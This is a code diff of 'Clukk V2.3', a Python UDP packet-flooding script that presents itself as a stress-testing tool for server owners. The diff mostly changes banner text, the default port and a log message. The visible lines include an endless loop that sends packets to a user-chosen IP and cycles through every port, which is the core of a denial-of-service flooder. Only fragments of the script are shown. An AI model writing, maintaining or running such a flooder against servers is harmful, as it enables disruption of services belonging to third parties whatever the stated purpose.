@@ -4,7 +4,7 @@ import time
 
 print("""
                 Clukk
-               NF V2.3
+             Release V2.3
 """)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -14,7 +14,7 @@ print("")
 print("Clukk Details:")
 print("")
 print("""
-Clukk NF V2.3
+Clukk Release V2.3
 Creator: BSP/IOD
 Purpose: Stress testing
 for server owners and
@@ -40,7 +40,7 @@ if choice == 'y':
     port = int(input("Port: "))
     portSpec = True
 else:
-    port = 0
+    port = 1
     portSpec = False
 print("")
 
@@ -63,6 +63,6 @@ while True:
 
     sock.sendto(bytes,(ip, port))
     sent = sent + 1
-    print("-- Clukk: Packet #%s of size %s bytes was sent to address %s on port %s."%(sent, bytesAmt, ip, port))
+    print("Packet #%s of size %s bytes was sent to address %s on port %s."%(sent, bytesAmt, ip, port))
     if portSpec is False:
         port = port + 1 if port < 65535 else 1
